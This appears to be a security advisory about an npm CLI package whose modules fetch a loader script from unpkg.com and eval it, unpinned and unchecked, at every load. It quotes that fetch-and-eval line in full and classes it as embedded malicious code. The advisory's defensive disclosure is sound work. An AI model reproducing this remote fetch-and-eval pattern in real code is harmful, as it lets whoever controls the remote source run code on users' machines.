summary: Unpinned remote fetch-and-eval of third-party loader on every CLI invocation
details: The package's main module and several supporting libraries (src/hive.mjs, src/lib.mjs, src/solve.mjs, src/config.lib.mjs, src/task.mjs, src/review.mjs, src/telegram-bot.mjs, src/reviewers-hive.mjs) execute `globalThis.use = (await eval(await (await fetch('https://unpkg.com/use-m/use.js')).text())).use;` at module load. The URL is not version-pinned, has no integrity hash, and the response body is passed directly to eval(). This installs an arbitrary npm-package loader (`use-m`) into the global scope and runs whatever bytes unpkg.com returns at that moment in every process that loads the package. Any future change to the upstream `use-m` package, or any compromise of unpkg.com's CDN, results in attacker-controlled code executing on the installer's machine. The fetch-and-eval primitive is reachable on normal CLI invocation, not gated behind a user action.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
